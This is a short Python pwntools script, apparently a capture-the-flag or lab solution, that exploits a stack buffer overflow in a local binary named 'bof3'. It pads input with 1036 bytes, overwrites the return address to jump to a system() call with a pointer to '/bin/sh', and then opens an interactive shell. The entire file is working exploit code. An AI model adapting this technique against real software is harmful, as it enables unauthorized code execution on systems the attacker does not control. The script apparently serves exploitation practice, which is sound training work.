#!/usr/bin/python
import sys
import time
import argparse
from pwn import *
context.update(arch='i386', os='linux')

def wait_for_prompt(r):
  print r.recvuntil("MUHAHAHAH: ")

def wait_newline_and_dump(r):
  data = r.recvuntil('\n')
  if data:
    print data.encode('hex')
    print data
  return data

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  args = parser.parse_args()
  exe = './bof3'

  if args.dbg:
    r = gdb.debug([exe], gdbscript="""
    b *func+107
    continue
    """)
  else:
    r = process(exe)

  wait_for_prompt(r)
  payload  = 'A'*1036
  payload += p32(0x0804856a)  #Return pointer. Point this to 0x0804856a <+79>:    call   0x80483e0 <system@plt>
  payload += p32(0x8048664)   #This will be the pointer passed to system(), make this a pointer to '/bin/sh'

  r.sendline(payload) 

  # Drop to interactive console
  r.interactive()

